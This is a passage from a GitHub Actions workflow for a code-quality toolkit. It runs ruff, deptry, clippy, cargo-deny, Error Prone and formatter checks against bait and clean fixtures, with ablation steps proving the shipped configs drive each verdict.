          # every config file, which is the only way to get ruff's true defaults.
          rc=0
          ruff format --check --config configs/python/ruff.toml \
            samples/format/needs_width_100.py >/dev/null 2>&1 || rc=$?
          [[ $rc -eq 0 ]] || {
            echo '::error::samples/format/needs_width_100.py is not clean under our config — line-length regressed, or the fixture line drifted outside 89-100 chars'
            exit 1; }
          rc=0
          ruff format --check --isolated samples/format/needs_width_100.py >/dev/null 2>&1 || rc=$?
          [[ $rc -ne 0 ]] || {
            echo '::error::samples/format/needs_width_100.py is clean at ruff defaults too — its long line no longer exceeds 88 chars, so it separates nothing'
            exit 1; }
          echo 'OK: the misformatted fixture fails and the width ablation separates 100 from 88'
      # --- deptry, issue #52 ------------------------------------------------
      # Unused (DEP002) and undeclared (DEP001) Python dependencies, measured
      # in #39: 2 of 2 planted findings, 0 false positives including the
      # import-name ≠ package-name trap.
      #
      # It lives HERE, beside the Layer 1 Python steps, and deliberately NOT
      # in the scan.sh / Layer 2 umbrella — that is the integration decision
      # #52 asked for. deptry is per-language and per-package by design:
      # measured at a consumer's workspace root it reported 125 findings, 118
      # of them one first-party artifact; on a member package, 3. A gate that
      # ships 94% noise on day one gets deleted, which is worse than no gate.
      # Layer 2 runs once per repo from the root; this tool must never do that.
      - name: Deptry fixture must fail with exactly the expected findings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; (cd samples/deptry && deptry src --json-output /tmp/deptry.json) >/tmp/deptry.log 2>&1 || rc=$?
          cat /tmp/deptry.log
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/deptry passed deptry — the dependency detection regressed'
            exit 1
          fi
          python3 scripts/check-expected.py --tool deptry \
            --input /tmp/deptry.json --expected samples/expected/deptry.json
      # The clean half needs its own pyproject.toml: deptry refuses to run at
      # all without a dependency manifest (measured — samples/python-clean
      # deliberately has none, so it cannot play this role).
      - name: Clean deptry sample must PASS with zero findings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; (cd samples/deptry-clean && deptry src --json-output /tmp/deptry-clean.json) >/tmp/deptry-clean.log 2>&1 || rc=$?
          cat /tmp/deptry-clean.log
          if [[ $rc -ne 0 ]]; then
            echo '::error::samples/deptry-clean was flagged — the gate is over-strict. Fix the invocation, do not add per-rule ignores to the fixture.'
            exit 1
          fi
          python3 scripts/check-expected.py --tool deptry \
            --input /tmp/deptry-clean.json --expected samples/expected/deptry-clean.json

      # --- the GRANULARITY, issue #97 ---------------------------------------
      # #52's one condition is "per package, never at a workspace root", and
      # until now it lived in prose: adopt.sh printed it as advice under a
      # heading that said OPTIONAL. It is scripts/deptry-targets.py now, so it
      # is a thing that can be wrong, and this is where it is proved wrong.
      - name: The deptry target enumeration must match the committed one
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 scripts/deptry-targets.py --dir samples/deptry-workspace > /tmp/targets.json
          # A plain diff of normalised JSON: unlike a finding manifest there is
          # no rule id to key on, and the ORDER is part of the claim (the root
          # is enumerated as a package in its own right, not skipped).
          python3 -m json.tool --sort-keys /tmp/targets.json > /tmp/targets.norm
          python3 -m json.tool --sort-keys samples/expected/deptry-targets.json > /tmp/targets.want
          diff -u /tmp/targets.want /tmp/targets.norm || {
            echo '::error::the deptry target enumeration drifted. Both halves matter: which directories are scanned, and which nested packages each one excludes.'
            exit 1; }
          echo 'OK: root + two members, with the members excluded from the root run'

      # THE ABLATION, and it is the whole reason the fixture exists. The
      # "workspace fixture must pass through the action" step below is the
      # other half — it runs the REAL enumeration-and-invocation loop rather
      # than a copy of it, which is why there is no hand-rolled loop here:
      # a test that re-implements the thing under test still passes when the
      # thing under test breaks.
      #
      # "Every package is clean" and "the granularity is what makes them clean"
      # are different claims, and only the second justifies the enumeration —
      # without this step a fixture with nothing to find would pass identically.
      #
      # Asserted as a count rather than a manifest on purpose: what is being
      # pinned is that the naive invocation reports the members' dependencies at
      # all, not which code it picks. deptry says DEP001 for a package that is
      # absent from the environment and DEP003 for one that is present, so a
      # manifest here would flap on what CI happens to have installed.
      - name: ...and the naive workspace-root run is NOT — 94% noise, measured
        shell: bash
        run: |
          set -uo pipefail
          rc=0
          (cd samples/deptry-workspace && deptry . --json-output /tmp/deptry-naive.json) \
            >/tmp/deptry-naive.log 2>&1 || rc=$?
          cat /tmp/deptry-naive.log
          if [[ $rc -eq 0 ]]; then
            echo '::error::a bare deptry run at the workspace root is clean too, so the per-package enumeration is proving nothing. Either the fixture lost its member packages or deptry learned to read workspaces — check before deleting scripts/deptry-targets.py.'
            exit 1
          fi
          n=$(python3 -c 'import json,sys; print(len(json.load(open(sys.argv[1]))))' /tmp/deptry-naive.json)
          [[ "$n" -eq 2 ]] || {
            echo "::error::expected the naive root run to report both members' dependencies (2 findings), got $n"
            exit 1; }
          echo 'OK: 0 findings per package, 2 from the same tree scanned as one'

      - name: The deptry gate gates the measured codes, and ratchets
        shell: bash
        run: |
          set -Eeuo pipefail
          # Rule AND file, never a count — same standard as the knip gate step
          # above, and the same reason.
          gates() { grep -E '^  GATE ' <<<"$1" | awk '{print $2, $3}' | sort; }
          same() {
            diff -u "$1" <(gates "$2") || { echo "::error::$3"; exit 1; }
          }

          # DEP001 and DEP002 are the two #39 planted and confirmed. DEP003 and
          # DEP004 were never measured here, so they report and do not gate.
          cat > /tmp/deptry-want.txt <<'WANT'
          DEP001 src/sample_deptry/main.py:4
          DEP002 pyproject.toml:0
          WANT
          out=$(python3 scripts/deadcode-gate.py --tool deptry \
                  --input /tmp/deptry.json) && rc=0 || rc=$?
          echo "$out"
          [[ "$rc" -eq 1 ]] || { echo '::error::the deptry gate did not fail on the bait fixture'; exit 1; }
          same /tmp/deptry-want.txt "$out" 'the gating deptry finding SET drifted — see the diff above'

          # DEP003 must be REPORTED and must NOT gate, and the naive
          # workspace-root run above is a free source of a real one to prove it
          # with — a fixture planted here would only prove the constant.
          out=$(python3 scripts/deadcode-gate.py --tool deptry \
                  --input /tmp/deptry-naive.json) && rc=0 || rc=$?
          echo "$out"
          grep -qE '^  advisory  DEP003 ' <<<"$out" || {
            echo '::error::DEP003 vanished instead of being reported as advisory'; exit 1; }
          grep -qE '^  GATE      DEP003 ' <<<"$out" && {
            echo '::error::DEP003 gated — it was never measured here, so it must only report'; exit 1; }

          # The ratchet: same findings, nothing changed, no gate — but still
          # reported. Silence would be a switched-off check wearing a ratchet.
          : > /tmp/deptry-nothing.txt
          out=$(python3 scripts/deadcode-gate.py --tool deptry --input /tmp/deptry.json \
                  --changed-list /tmp/deptry-nothing.txt) && rc=0 || rc=$?
          [[ "$rc" -eq 0 ]] || { echo '::error::an empty diff must produce no gating deptry findings'; exit 1; }
          grep -qx 'deptry_advisory=2' <<<"$out" || {
            echo '::error::an empty diff must still REPORT both findings'; exit 1; }

          # ...and the manifest is exactly what a dependency edit touches, so
          # DEP002 gating on a changed pyproject.toml is the case that matters.
          printf 'pyproject.toml\n' > /tmp/deptry-changed.txt
          printf 'DEP002 pyproject.toml:0\n' > /tmp/deptry-want-ratchet.txt
          out=$(python3 scripts/deadcode-gate.py --tool deptry --input /tmp/deptry.json \
                  --changed-list /tmp/deptry-changed.txt) && rc=0 || rc=$?
          [[ "$rc" -eq 1 ]] || { echo '::error::a DEP002 on a CHANGED manifest must gate'; exit 1; }
          same /tmp/deptry-want-ratchet.txt "$out" \
            'the ratchet must gate the pyproject.toml finding and only that'
          echo 'OK: DEP001/DEP002 gate, DEP003 reports only, and the ratchet holds both ways'

      # The composite action, exercised rather than re-implemented — the same
      # argument the layer2 job makes for `uses: ./actions/layer2`.
      - name: The workspace fixture must pass through the action itself
        id: ws
        continue-on-error: true
        uses: ./actions/deadcode
        with:
          tool: deptry
          dir: samples/deptry-workspace
          mode: require

      - name: ...and the bait fixture must not
        id: bait
        continue-on-error: true
        uses: ./actions/deadcode
        with:
          tool: deptry
          dir: samples/deptry
          mode: require

      - name: A directory with no readable manifest warns, and requires
        id: nomanifest
        continue-on-error: true
        uses: ./actions/deadcode
        with:
          tool: deptry
          dir: samples/python-clean
          mode: auto

      - name: Every deptry action outcome must be the expected one
        shell: bash
        env:
          WS: ${{ steps.ws.outcome }}
          BAIT: ${{ steps.bait.outcome }}
          NOMANIFEST: ${{ steps.nomanifest.outcome }}
        run: |
          set -Eeuo pipefail
          [[ "$WS" == 'success' ]] || {
            echo "::error::the workspace fixture failed through the action (outcome=$WS) — the enumeration works standalone and not where consumers run it"; exit 1; }
          [[ "$BAIT" == 'failure' ]] || {
            echo "::error::the bait fixture passed through the action (outcome=$BAIT) — the gate does not gate"; exit 1; }
          # samples/python-clean deliberately has no dependency manifest, which
          # is the "nothing was examined" case. auto must let it through and say
          # so; it must never read as a clean scan.
          [[ "$NOMANIFEST" == 'success' ]] || {
            echo "::error::auto mode failed on a directory with no manifest (outcome=$NOMANIFEST)"; exit 1; }
          echo 'OK: the workspace passes, the bait fails, and an unexaminable directory warns rather than lying'

  # #58 — Rust Layer 1. clippy is the conventions layer (Semgrep's Rust support
  # is experimental and stays out), cargo-deny is the supply chain. The
  # toolchain and cargo-deny are PINNED to the same versions adopt.sh stamps
  # into consumers — check-pins.sh asserts that stays true, because CI
  # validating a different analyzer than consumers run is how the samples stop
  # meaning what they claim (#13).
  layer1-rust:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Pinned toolchain and cargo-deny
        shell: bash
        env:
          # From the .sha256 file next to the release artifact. Verifying it is
          # the difference between "we downloaded a binary" and "we downloaded
          # THAT binary" — same standard the actionlint step sets.
          CARGO_DENY_SHA256: '9f12ed4c49936e09b48bf862b595cde2fe64fcbd9d74dfacac6131ca824c8d5f'
        run: |
          set -Eeuo pipefail
          rustup toolchain install 1.97.1 --profile minimal --component clippy,rustfmt
          rustup default 1.97.1
          curl -sSfL -o /tmp/cargo-deny.tgz \
            https://github.com/EmbarkStudios/cargo-deny/releases/download/0.20.2/cargo-deny-0.20.2-x86_64-unknown-linux-musl.tar.gz
          echo "${CARGO_DENY_SHA256}  /tmp/cargo-deny.tgz" | sha256sum -c -
          tar xzf /tmp/cargo-deny.tgz -C "$HOME/.cargo/bin" --strip-components=1 \
            cargo-deny-0.20.2-x86_64-unknown-linux-musl/cargo-deny
          cargo deny --version
      # The fixture manifests carry COPIES of configs/rust (same shape as the
      # sample .editorconfigs, and the same drift risk). rustfmt.toml and
      # deny.toml must match verbatim; the [lints] block appended to each
      # fixture Cargo.toml must be byte-identical to what adopt.sh derives
      # from lints.toml for a single crate.
      - name: Fixture copies must match configs/rust verbatim
        shell: bash
        run: |
          set -Eeuo pipefail
          for d in samples/rust samples/rust-clean; do
            diff -u configs/rust/rustfmt.toml "$d/rustfmt.toml" || {
              echo "::error::$d/rustfmt.toml drifted from configs/rust — recopy it"; exit 1; }
            diff -u configs/rust/deny.toml "$d/deny.toml" || {
              echo "::error::$d/deny.toml drifted from configs/rust — recopy it"; exit 1; }
            sed 's/^\[workspace\.lints/[lints/' configs/rust/lints.toml > /tmp/expected-lints.toml
            awk '/# maxi-quality — Rust lint baseline/{found=1} found{print}' "$d/Cargo.toml" > /tmp/actual-lints.toml
            diff -u /tmp/expected-lints.toml /tmp/actual-lints.toml || {
              echo "::error::the [lints] block in $d/Cargo.toml drifted from configs/rust/lints.toml — regenerate it the way adopt.sh writes it"
              exit 1; }
          done
          echo 'OK: both fixtures carry configs/rust verbatim'
      # #8's pattern, Rust edition: the manifests pin what the fixtures BAIT,
      # not what the config ENABLES. The resolved lint argv, the resolved
      # rustfmt config and the deny.toml posture are asserted directly —
      # forbid-vs-deny on unsafe_code is invisible to every fixture.
      - name: The resolved Rust settings must not change silently
        shell: bash
        run: python3 scripts/snapshot-rust-settings.py --check
      - name: Sample must fail clippy with exactly the expected findings
        shell: bash
        run: |
          set -uo pipefail
          # First the gate a consumer actually gets: -Dwarnings and a
          # non-zero exit...
          rc=0; out=$(cd samples/rust && RUSTFLAGS=-Dwarnings cargo clippy --all-targets --locked 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/rust passed clippy — the config regressed'
            exit 1
          fi
          # ...then WHICH lints fired, from the machine-readable output. No
          # -Dwarnings here: the JSON run matches how the manifest was
          # generated, and the flag only relabels levels the parser already
          # accepts.
          (cd samples/rust && cargo clippy --all-targets --locked --message-format=json) > /tmp/clippy.json 2>/dev/null || true
          python3 scripts/check-expected.py --tool clippy \
            --input /tmp/clippy.json --expected samples/expected/clippy.json
      # Every enabled tier must be REPRESENTED, not just some finding set —
      # the same belt the 13 ruff families get. One rule per tier: the rust
      # group at forbid, clippy::all, pedantic, a curated nursery pick and a
      # curated cargo pick. Any tier vanishing from the fixture's output means
      # that tier was switched off, whatever the total says.
      - name: Every lint tier must be represented
        shell: bash
        run: |
          set -uo pipefail
          missing=()
          for rule in unsafe_code clippy::needless_return clippy::cast_possible_truncation \
                      clippy::or_fun_call clippy::wildcard_dependencies; do
            grep -q "\"$rule\"" /tmp/clippy.json || missing+=("$rule")
          done
          if [[ ${#missing[@]} -gt 0 ]]; then
            echo "::error::no finding from ${missing[*]} — that tier is enabled but unproven"
            exit 1
          fi
          echo 'OK: rust-forbid, all, pedantic, nursery and cargo tiers all fire'
      - name: Clean Rust sample must pass clippy with zero warnings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(cd samples/rust-clean && RUSTFLAGS=-Dwarnings cargo clippy --all-targets --locked 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -ne 0 ]]; then
            echo '::error::samples/rust-clean was flagged — the baseline is over-strict. Fix the config, do not add #[allow] to the fixture.'
            exit 1
          fi
          (cd samples/rust-clean && cargo clippy --all-targets --locked --message-format=json) > /tmp/clippy-clean.json 2>/dev/null || true
          python3 scripts/check-expected.py --tool clippy \
            --input /tmp/clippy-clean.json --expected samples/expected/clippy-clean.json
      # --- the formatter ----------------------------------------------------
      - name: The misformatted fixture must be REJECTED, the clean one passed
        shell: bash
        run: |
          set -uo pipefail
          rc=0; (cd samples/rust && cargo fmt --check) >/dev/null 2>&1 || rc=$?
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/rust passed cargo fmt --check. Either the fixture was formatted (do not do that) or the gate stopped reading it.'
            exit 1
          fi
          rc=0; (cd samples/rust-clean && cargo fmt --check) || rc=$?
          if [[ $rc -ne 0 ]]; then
            echo '::error::samples/rust-clean failed cargo fmt --check — reformat it or fix rustfmt.toml'
            exit 1
          fi
          echo 'OK: the formatter rejects the bait and passes the clean fixture'
      # THE ABLATION. rustfmt's max_width default already IS the house 100, so
      # width separates nothing here; newline_style = "Unix" is the setting
      # that genuinely differs from the default ("Auto": whatever the file
      # already uses). The fixture is consistently-CRLF and correct otherwise:
      # clean under rustfmt's defaults, rejected under our config. Guarded
      # first, because an editor or attributes filter normalising it to LF
      # would turn both runs green and the ablation would silently stop
      # testing anything.
      - name: The shipped rustfmt.toml must be what decides the verdict
        shell: bash
        run: |
          set -uo pipefail
          if ! grep -q $'\r' samples/format/crlf_line_endings.rs; then
            echo '::error::samples/format/crlf_line_endings.rs no longer contains CRLF, so it cannot separate newline_style = "Unix" from the Auto default. Restore it with printf, not an editor.'
            exit 1
          fi
          rc=0
          rustfmt --check samples/format/crlf_line_endings.rs >/dev/null 2>&1 || rc=$?
          [[ $rc -eq 0 ]] || {
            echo "::error::the CRLF fixture failed rustfmt with NO config (exit $rc) — it is misformatted in some way other than its line endings, so the ablation no longer isolates newline_style"
            exit 1; }
          rc=0
          rustfmt --config-path configs/rust/rustfmt.toml --check \
            samples/format/crlf_line_endings.rs >/dev/null 2>&1 || rc=$?
          [[ $rc -ne 0 ]] || {
            echo '::error::the CRLF fixture PASSED with configs/rust/rustfmt.toml — newline_style is no longer enforced, so the Rust format gate is running on tool defaults'
            exit 1; }
          echo 'OK: configs/rust/rustfmt.toml changes the verdict'
      # --- cargo-deny -------------------------------------------------------
      # The advisory bait sits behind a cfg(windows) gate, so Linux CI never
      # downloads or builds it — but the LOCKFILE is target-independent, and
      # the lockfile is all cargo-deny reads.
      - name: Dirty lockfile must fail advisories on both planted RUSTSEC ids
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(cd samples/rust && cargo deny check advisories bans 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/rust passed cargo-deny — the advisories gate regressed'
            exit 1
          fi
          grep -q 'RUSTSEC-2021-0003' <<<"$out" || {
            echo '::error::the failure is not the planted vulnerability (RUSTSEC-2021-0003, smallvec 1.6.0) — something else broke'
            exit 1; }
          # The unmaintained half (#105). `[advisories] unmaintained =
          # "workspace"` narrows WHICH unmaintained advisories are reported;
          # it does not switch the class off, so a crate this manifest picked
          # itself must still fail — including behind a cfg() gate, since the
          # scope is about who chose the crate, not about what gets built.
          grep -q 'RUSTSEC-2024-0370' <<<"$out" || {
            echo '::error::the planted unmaintained crate (RUSTSEC-2024-0370, proc-macro-error) no longer fails — a DIRECT unmaintained dependency must still gate'
            exit 1; }
          echo 'OK: both planted advisories fail the check'
      - name: Clean lockfile must pass advisories and bans
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(cd samples/rust-clean && cargo deny check advisories bans 2>&1) || rc=$?
          echo "$out"
          [[ $rc -eq 0 ]] || {
            echo '::error::samples/rust-clean was flagged by cargo-deny — the posture is over-strict or the DB fetch failed'
            exit 1; }
      # A clean pass proves nothing unless the tree it passed on actually
      # contains the thing being scoped out — the gap #105 was found through.
      # Same config, one key flipped back to the tool default: it must FAIL,
      # and fail as `unmaintained`. Without this, the key could be set to
      # "none" or the dependency could vanish and the step above stays green.
      - name: The clean fixture must only pass because of the unmaintained scope
        shell: bash
        run: |
          set -uo pipefail
          sed 's/^unmaintained = "workspace"/unmaintained = "all"/' \
            samples/rust-clean/deny.toml > /tmp/deny-unmaintained-all.toml
          grep -q '^unmaintained = "all"' /tmp/deny-unmaintained-all.toml || {
            echo '::error::could not flip [advisories] unmaintained in the fixture config — the key moved, or is no longer set explicitly'
            exit 1; }
          rc=0; out=$(cd samples/rust-clean && cargo deny \
            --config /tmp/deny-unmaintained-all.toml check advisories 2>&1) || rc=$?
          echo "$out"
          [[ $rc -ne 0 ]] || {
            echo '::error::samples/rust-clean passed with unmaintained = "all" — its dependency tree no longer carries a transitive unmaintained crate, so the clean pass above asserts nothing'
            exit 1; }
          grep -q 'error\[unmaintained\]' <<<"$out" || {
            echo '::error::the clean fixture failed at unmaintained = "all", but not on an unmaintained advisory — something else broke'
            exit 1; }
          echo 'OK: the clean fixture carries transitive unmaintained crates, and only the workspace scope lets it pass'
      - name: Clean sample tests must pass
        shell: bash
        run: |
          set -Eeuo pipefail
          (cd samples/rust-clean && cargo test --locked)
      # --- adopt.sh equivalence, the Rust half of the adopt job -------------
      # The toolchain lives in THIS job, so the end-to-end claim does too: a
      # fresh `cargo new` adopted by the script must pass the entire gate at
      # zero findings, re-running must change nothing, and a manifest that
      # already has [lints] must be skipped, not clobbered.
      - name: A fresh cargo-new project adopted by the script passes at zero
        shell: bash
        run: |
          set -Eeuo pipefail
          cargo new /tmp/consumer-rust
          ./scripts/adopt.sh /tmp/consumer-rust --no-workflow
          cd /tmp/consumer-rust
          cargo generate-lockfile
          cargo fmt --check
          RUSTFLAGS=-Dwarnings cargo clippy --all-targets --locked
          cargo deny check advisories bans
          cargo test --locked
          echo 'OK: adopted fresh project passes fmt, clippy, deny and test at zero'
      - name: Rust adoption is idempotent, and never merges by force
        shell: bash
        run: |
          set -Eeuo pipefail
          before=$(sha256sum /tmp/consumer-rust/Cargo.toml | cut -d' ' -f1)
          ./scripts/adopt.sh /tmp/consumer-rust --no-workflow > /tmp/rust-rerun.log 2>&1
          after=$(sha256sum /tmp/consumer-rust/Cargo.toml | cut -d' ' -f1)
          [[ "$before" == "$after" ]] || {
            echo '::error::re-run modified Cargo.toml — the [lints] append is not idempotent'; exit 1; }
          n=$(grep -c 'maxi-quality — Rust lint baseline' /tmp/consumer-rust/Cargo.toml)
          [[ "$n" -eq 1 ]] || { echo "::error::[lints] block appended $n times"; exit 1; }
          # A manifest with its OWN [lints] section: skip and warn, never merge.
          cargo new /tmp/consumer-rust-lints
          printf '\n[lints.clippy]\ndbg_macro = "warn"\n' >> /tmp/consumer-rust-lints/Cargo.toml
          out=$(./scripts/adopt.sh /tmp/consumer-rust-lints --no-workflow 2>&1)
          grep -q 'merge configs/rust/lints.toml' <<<"$out" || {
            echo '::error::adopt.sh did not warn about an existing [lints] section'; exit 1; }
          if grep -q 'maxi-quality — Rust lint baseline' /tmp/consumer-rust-lints/Cargo.toml; then
            echo '::error::adopt.sh appended a second [lints] table to a manifest that already had one'
            exit 1
          fi
          echo 'OK: re-run is idempotent and an existing [lints] is left alone'

  # #10 — Java Layer 1. Error Prone is the bug finder, NullAway the null-safety
  # layer, spotless+palantir the formatter. Semgrep's Java support is good (the
  # opposite of its Rust story), so the Java conventions are real Layer 2 rules
  # and this job is Layer 1 only.
  #
  # The JDK and all four analyzer versions are PINNED to what consumers get —
  # check-pins.sh asserts that stays true, because CI validating a different
  # analyzer than consumers run is how the samples stop meaning what they claim
  # (#13). Error Prone reaches into javac internals, so the finding set is
  # JDK-specific in a way clippy's is not.
  layer1-java:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - uses: actions/setup-java@b6effb05e454b25005698d916606bdc6ffcbf961 # v5.7.0
        with:
          distribution: temurin
          java-version: '25'
          cache: maven
      # The fixture poms carry a COPY of configs/java/pom-lints.xml (same shape
      # as the sample .editorconfigs and the Rust [lints] block, and the same
      # drift risk). scripts/pom-region.py is the generator, so `check` is the
      # assertion that the three fixtures are byte-identical to what adopt.sh
      # would write today.
      - name: Fixture poms must carry configs/java verbatim
        shell: bash
        run: |
          set -Eeuo pipefail
          for d in samples/java samples/java-clean samples/java-lint; do
            python3 scripts/pom-region.py check --pom "$d/pom.xml" \
              --fragment configs/java/pom-lints.xml
          done
          echo 'OK: all three fixture poms carry the shipped lint region verbatim'
      # #8's pattern, Java edition, and here it covers more than usual: `-Werror`
      # is invisible to a fixture whose findings are all ERROR-severity, the four
      # pinned versions bake out no diagnostic until the day an upgrade adds a
      # check, <style>AOSP</style> shows up only in the formatter's verdict, and
      # <fork>true</fork> decides whether Error Prone runs AT ALL rather than
      # what it reports. The snapshot reads Maven's own resolver, after Spring
      # Boot's parent has had its say.
      - name: The resolved Java settings must not change silently
        shell: bash
        run: python3 scripts/snapshot-java-settings.py --check
      # NOT `working-directory:` — the manifests hold repo-relative paths, so
      # check-expected.py has to run from the repo root. Maven reports ABSOLUTE
      # paths (javac is forked), and the parser folds them back.
      - name: Sample must fail with exactly the expected findings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(cd samples/java && mvn -B --no-transfer-progress compile 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -eq 0 ]]; then
            echo '::error::samples/java compiled successfully — the config regressed'
            exit 1
          fi
          printf '%s' "$out" | python3 scripts/check-expected.py --tool javac \
            --input - --expected samples/expected/java.json
      # Every enabled tier must be REPRESENTED, the same belt the 13 ruff
      # families and the five clippy tiers get. Three things can switch off
      # independently here and two of them look identical from outside when they
      # do: Error Prone loaded at all, its WARNING tier gating, and NullAway
      # escalated to ERROR.
      - name: Every analyzer tier must be represented
        shell: bash
        run: |
          set -uo pipefail
          out=$(cd samples/java && mvn -B --no-transfer-progress compile 2>&1) || true
          missing=()
          for tier in ArrayEquals ReferenceEquality NullAway; do
            grep -q "\[$tier\]" <<<"$out" || missing+=("$tier")
          done
          if [[ ${#missing[@]} -gt 0 ]]; then
            echo "::error::no finding from ${missing[*]} — that tier is enabled but unproven"
            exit 1
          fi
          echo 'OK: Error Prone ERROR, Error Prone WARNING and NullAway all fire'
      - name: Clean Java sample must COMPILE and TEST with zero findings
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(cd samples/java-clean && mvn -B --no-transfer-progress test 2>&1) || rc=$?
          echo "$out"
          if [[ $rc -ne 0 ]]; then
            echo '::error::samples/java-clean was flagged — the baseline is over-strict. Fix the config, do not add @SuppressWarnings to the fixture.'
            exit 1
          fi
          printf '%s' "$out" | python3 scripts/check-expected.py --tool javac \
            --input - --expected samples/expected/java-clean.json
      # --- the -Werror interaction, pinned from BOTH sides -------------------
      #
      # MEASURED 2026-08-09: a javac -Xlint warning ends the compile before
      # Error Prone's pass runs, so every Error Prone and NullAway finding
      # disappears from the output. The build stays RED, so this can never make
      # a gate pass over unexamined code — but the finding LIST is short by
      # however many the analyzer would have added, and a reader who does not
      # know that is wrong about their own backlog.
      #
      # Nothing fixes it: no spelling of javac's should-stop policy, and
      # <failOnWarning> is implemented BY ADDING -Werror. So it is pinned as a
      # tested property instead of a footnote, which is also what stops somebody
      # "fixing" it later by quietly dropping -Werror.
      - name: A javac lint warning must gate, and must suppress the analyzer pass
        shell: bash
        run: |
          set -uo pipefail
          rc=0; out=$(cd samples/java-lint && mvn -B --no-transfer-progress compile 2>&1) || rc=$?
          echo "$out"
          [[ $rc -ne 0 ]] || {
            echo '::error::samples/java-lint compiled successfully — -Werror is no longer gating javac lint'
            exit 1; }
          grep -q 'warnings found and -Werror specified' <<<"$out" || {
            echo '::error::the failure is not -Werror — something else broke in samples/java-lint'
            exit 1; }
          if grep -q '\[ReferenceEquality\]' <<<"$out"; then
            echo '::error::Error Prone reported a finding alongside javac lint warnings. That is BETTER than the documented behaviour, which means the documentation is now wrong: re-measure, then update configs/java/pom-lints.xml, docs/STATUS.md §4 and samples/java-lint before deleting this check.'
            exit 1
          fi
          printf '%s' "$out" | python3 scripts/check-expected.py --tool javac \
            --input - --expected samples/expected/java-lint.json
      # THE ABLATION, and it does double duty. Stripping -Werror must (a) turn
      # the fixture GREEN, proving -Werror is what gates both javac lint and
      # Error Prone's warning tier, and (b) make the Error Prone finding APPEAR,
      # proving it was being SUPPRESSED above rather than merely absent. Without
      # (b) the check above passes just as happily against an Error Prone that
      # stopped working entirely.
      - name: ...and stripping -Werror must free the analyzer AND stop gating
        shell: bash
        run: |
          set -uo pipefail
          rm -rf /tmp/ablate && cp -R samples/java-lint /tmp/ablate && rm -rf /tmp/ablate/target
          python3 - <<'PY'
          import re
          p = '/tmp/ablate/pom.xml'
          s = open(p).read()
          out = re.sub(r'[ \t]*<arg>-Werror</arg>\n', '', s)
          assert out != s, 'the -Werror arg is gone from the fixture pom already'
          open(p, 'w').write(out)
          PY
          rc=0; out=$(cd /tmp/ablate && mvn -B --no-transfer-progress compile 2>&1) || rc=$?
          echo "$out"
          [[ $rc -eq 0 ]] || {
            echo '::error::samples/java-lint still fails with -Werror removed, so that flag is not what gates it — the fixture is misformed in some other way and the check above proves nothing'
            exit 1; }
          grep -q '\[ReferenceEquality\]' <<<"$out" || {
            echo '::error::the Error Prone finding did NOT appear with -Werror removed. It was absent rather than suppressed, which means Error Prone is not running on this fixture at all and the interaction check above is vacuous.'
            exit 1; }
          echo 'OK: -Werror gates both tiers, and is what suppresses the analyzer pass'
      # --- the formatter -----------------------------------------------------
      - name: Java fixtures must already be formatted
        shell: bash
        run: |
          set -Eeuo pipefail
          for d in samples/java samples/java-clean samples/java-lint; do
            (cd "$d" && mvn -B --no-transfer-progress spotless:check)
          done
      # THE ABLATION. Everything else in the spotless block is a default;
      # <style>AOSP</style> is the one setting that is not (palantir-java-format
      # ships PALANTIR, which wraps at 120). So the fixture is a file that is
      # clean at 100 columns and rewrapped at 120 — the same width ablation the
      # Prettier and ruff gates use, and the reason configs/editorconfig's
      # max_line_length = 100 and this formatter agree rather than fighting.
      - name: The AOSP style must be what decides the Java verdict
        shell: bash
        run: |
          set -uo pipefail
          rm -rf /tmp/fmt-java && cp -R samples/java-clean /tmp/fmt-java && rm -rf /tmp/fmt-java/target
          cp samples/format/NeedsWidth100.java \
            /tmp/fmt-java/src/main/java/dev/maximalcode/sample/NeedsWidth100.java
          rc=0; (cd /tmp/fmt-java && mvn -B --no-transfer-progress spotless:check) >/dev/null 2>&1 || rc=$?
          [[ $rc -eq 0 ]] || {
            echo '::error::samples/format/NeedsWidth100.java is not clean under our config — the AOSP style regressed, or the fixture line drifted outside 101-120 chars'
            exit 1; }
          python3 - <<'PY'
          p = '/tmp/fmt-java/pom.xml'
          s = open(p).read()
          out = s.replace('<style>AOSP</style>\n', '')
          assert out != s, 'the AOSP style is gone from the fixture pom already'
          open(p, 'w').write(out)
          PY
          rc=0; (cd /tmp/fmt-java && mvn -B --no-transfer-progress spotless:check) >/dev/null 2>&1 || rc=$?
          [[ $rc -ne 0 ]] || {
            echo '::error::the fixture is clean at palantir-java-format DEFAULTS too, so <style>AOSP</style> separates nothing. Either its long line no longer exceeds 100 chars, or palantir changed its default width.'
            exit 1; }
          echo 'OK: <style>AOSP</style> changes the verdict — the Java format gate is driven by the shipped config'
      # --- adopt.sh equivalence, the Java half -------------------------------
      # The JDK lives in THIS job, so the end-to-end claim does too: a fresh
      # Maven project adopted by the script must gate identically, re-running
      # must change nothing, and a pom that already configures the compiler
      # plugin must be REFUSED rather than clobbered.
      - name: A fresh Maven project adopted by the script gates identically
        shell: bash
        run: |
          set -Eeuo pipefail
          rm -rf /tmp/consumer-java
          mkdir -p /tmp/consumer-java/src/main/java/demo
          cat > /tmp/consumer-java/pom.xml <<'POM'
          <?xml version="1.0" encoding="UTF-8"?>
          <project xmlns="http://maven.apache.org/POM/4.0.0">
            <modelVersion>4.0.0</modelVersion>
            <groupId>demo</groupId>
            <artifactId>consumer</artifactId>
            <version>1.0</version>
            <properties>
              <maven.compiler.release>25</maven.compiler.release>
              <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
            </properties>
            <build>
              <plugins>
              </plugins>
            </build>
